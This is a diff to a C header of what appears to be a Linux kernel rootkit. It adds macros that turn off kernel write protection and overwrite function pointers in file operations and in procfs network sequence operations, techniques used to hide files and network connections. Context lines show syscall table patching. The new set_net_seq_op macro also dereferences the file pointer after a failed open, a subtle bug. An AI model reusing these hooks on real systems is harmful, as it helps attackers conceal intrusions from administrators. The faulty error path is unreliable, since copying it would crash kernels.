@@ -34,29 +34,50 @@ along with this program.  If not, see <http://www.gnu.org/licenses/>.
     sys_call_table[__NR_##name] = (void *)real_##name
 
 
-# define set_f_op(op, path, new, old)                       \
+# define set_file_op(op, path, new, old)                            \
+    do {                                                            \
+        struct file *filp;                                          \
+        struct file_operations *f_op;                               \
+                                                                    \
+        fm_alert("Opening the path: %s.\n", path);                  \
+        filp = filp_open(path, O_RDONLY, 0);                        \
+        if (IS_ERR(filp)) {                                         \
+            fm_alert("Failed to open %s with error %ld.\n",         \
+                     path, PTR_ERR(filp));                          \
+            old = NULL;                                             \
+        } else {                                                    \
+            fm_alert("Succeeded in opening: %s\n", path);           \
+            f_op = (struct file_operations *)filp->f_op;            \
+            old = f_op->op;                                         \
+                                                                    \
+            fm_alert("Changing file_op->" #op " from %p to %p.\n",  \
+                     old, new);                                     \
+            disable_write_protection();                             \
+            f_op->op = new;                                         \
+            enable_write_protection();                              \
+        }                                                           \
+    } while(0)
+
+# define set_net_seq_op(op, path, afinfo_struct, new, old)  \
     do {                                                    \
         struct file *filp;                                  \
-        struct file_operations *f_op;                       \
+        afinfo_struct *afinfo;                              \
                                                             \
-        fm_alert("Opening the path: %s.\n", path);          \
         filp = filp_open(path, O_RDONLY, 0);                \
         if (IS_ERR(filp)) {                                 \
             fm_alert("Failed to open %s with error %ld.\n", \
                      path, PTR_ERR(filp));                  \
             old = NULL;                                     \
-        } else {                                            \
-            fm_alert("Succeeded in opening: %s\n", path);   \
-            f_op = (struct file_operations *)filp->f_op;    \
-            old = f_op->op;                                 \
-                                                            \
-            fm_alert("Changing iterate from %p to %p.\n",   \
-                     old, new);                             \
-            disable_write_protection();                     \
-            f_op->op = new;                                 \
-            enable_write_protection();                      \
         }                                                   \
-    } while(0)
+                                                            \
+        afinfo = PDE_DATA(filp->f_path.dentry->d_inode);    \
+        old = afinfo->seq_ops.op;                           \
+        fm_alert("Setting seq_op->" #op " from %p to %p.",  \
+                 old, new);                                 \
+        afinfo->seq_ops.op = new;                           \
+                                                            \
+        filp_close(filp, 0);                                \
+    } while (0)
 
 
 unsigned long **
